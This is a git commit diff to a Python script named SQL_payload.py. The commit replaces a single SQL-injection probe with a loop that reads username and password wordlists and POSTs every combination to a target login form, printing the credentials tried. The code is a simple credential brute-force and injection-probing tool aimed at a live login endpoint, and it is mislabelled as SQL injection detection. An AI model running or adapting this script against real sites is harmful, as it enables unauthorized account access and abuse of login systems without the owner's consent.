ce07b3a6ef6e818a32be841841415ea47d56d223
Ruben <rubenskywalker44@gmail.com>
2023-01-05 17:06:11 +0200

    Made the SQL_payload better

--- SQL_payload.py
+++ SQL_payload.py
@@ -10,17 +10,32 @@ data_file = input('Enter the name of the file containing the data to be sent in 
 with open(data_file, 'r') as f:
   data = dict(item.split('=') for item in f.read().split('&'))
 
-# Prompt the user for the payload to be injected
-payload = input('Enter the payload to be injected: ')
+# Prompt the user for the name of the file containing the list of usernames
+username_file = input('Enter the name of the file containing the list of usernames: ')
 
-# Inject the payload into the data dictionary
-data['username'] = payload
+# Read the list of usernames from the file
+with open(username_file, 'r') as f:
+  usernames = f.read().strip().split('\n')
 
-# Send a POST request to the login form with the injected payload
-response = requests.post(target_url, data=data)
+# Prompt the user for the name of the file containing the list of passwords
+password_file = input('Enter the name of the file containing the list of passwords: ')
 
-# Check the response for any indicators of a successful SQL injection attack
-if 'error' in response.text.lower():
-  print('Possible SQL injection vulnerability found!')
-else:
-  print('No SQL injection vulnerability found.')
+# Read the list of passwords from the file
+with open(password_file, 'r') as f:
+  passwords = f.read().strip().split('\n')
+
+# Iterate over the list of usernames and passwords
+for username in usernames:
+  for password in passwords:
+    # Inject the username and password into the data dictionary
+    data['username'] = username
+    data['password'] = password
+
+    # Send a POST request to the login form with the injected data
+    response = requests.post(target_url, data=data)
+
+    # Check the response for any indicators of a successful SQL injection attack
+    if 'error' in response.text.lower():
+      print(f'Possible SQL injection vulnerability found using username "{username}" and password "{password}"!')
+    else:
+      print(f'No SQL injection vulnerability found using username "{username}" and password "{password}".')
